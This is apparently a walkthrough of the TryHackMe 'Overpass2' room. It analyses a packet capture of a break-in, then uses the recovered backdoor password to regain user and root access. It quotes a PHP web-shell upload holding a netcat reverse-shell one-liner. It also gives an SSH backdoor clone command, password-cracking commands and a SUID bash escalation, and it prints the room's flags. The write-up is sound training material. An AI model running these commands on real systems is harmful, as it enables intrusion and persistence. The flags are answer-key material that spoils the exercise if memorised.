# Overpass2 - Linux - Easy

## Task-1

### What was the URL of the page they used to upload a reverse shell?

Checking for a POST request would do the trick.

`/development/`

### What payload did the attacker use to gain access?

Checking the same POST request dumping all the ascii text from the request can make this spotting a bit easier.

```
)n)ºHEô
.@@VTÀ¨ªÀ¨ªºvPÃró:
'ö©ó
Â¦+5P,ÆPOST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/
Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
Content-Length: 454
Connection: keep-alive
Upgrade-Insecure-Requests: 1

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------1809049028579987031515260006--
```

### What password did the attacker use to privesc?

Checking the above payload for reverse shell we can know that port used is **4242**. Attacker IP is **192.168.170.145** and the machine that was attacked has IP **192.168.170.159**. Filtering packets using the following info in wireshark will make it bit easier to spot.

`ip.src==192.168.170.159 && ip.dst==192.168.170.145 && tcp.port==4242`

Just follow the first TCP stream now and we get the following:

`whenevernoteartinstant`

### How did the attacker establish persistence?

Checking the TCP stream we got in above it clearly mentions using git clone.

`git clone https://github.com/NinjaJc01/ssh-backdoor`

### Using the fasttrack wordlist, how many of the system passwords were crackable?

In the TCP stream we are following we also get to see the */etc/shadow* file contents. Just copy paste them into a file and run **john** on the file.

*Well the answer is **4**.*


## Task-2

### What's the default hash for the backdoor?

Just check the var in https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go

`bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

### What's the hardcoded salt for the backdoor?

Simply check the function call with some static value

`1c362db832f3f864c8c2fe05f2002a05`

### What was the hash that the attacker used? - go back to the PCAP for this!

Can be found in the TCP stream for nc. Suplied to backdoor using *./backdoor -a <some_value>*

`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

### Crack the hash using rockyou and a cracking tool of your choice. What's the password?

Using hashcat here might help. It uses module 1710.so for this type of cracking where we have salted hash. we have both our hash and salt. Making a file hc with the following contents:

`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05`

Here it is written in form of *hash*:*salt* as per needed by hashcat. Using the following command to run hashcat and crack it.

`hashcat -m 1710 -o ch htc rockyou.txt` 

where **htc** is the file with hash:salt and **ch** is the output file after cracking is done. Once done just check the **ch** file for cracked hash value.

`november16`


## Task-3

### The attacker defaced the website. What message did they leave as a heading? 

`H4ack3d by CooctusClan`

### Using the information you've found previously, hack your way back in!

Let's start with nmap scan for the machine.

`nmap 10.10.222.177 -oN nmap_scan`

It shows 3 ports are open: **22**, **80** and **2222**. Through our wireshark packet capture we know that 2222 is a ssh port being used by the **ssh-backdoor**. Let's just use that backdoor to get in.

`ssh james@10.10.222.117 -p 2222`

Using password `november16` the one we got from cracking that hash, we got ourselves in.

### User.txt

This is easy... once we get in: `cat /home/james/user.txt`

`thm{d119b4fa8c497ddb0525f7ad200e6567}`


### Root.txt

Checked using find command for any suid binaries I could exploit it was in vain. Reading the hint on tryhackme gave a bit of direction. All I needed to do was `ls -al`

There it is `.suid_bash`. Executing it by giving *-p* we get ourselves root. Lastly checking the `/root/root.txt` file we get ourselves the final flag for the machine.

`thm{d53b2684f169360bb9606c333873144d}`

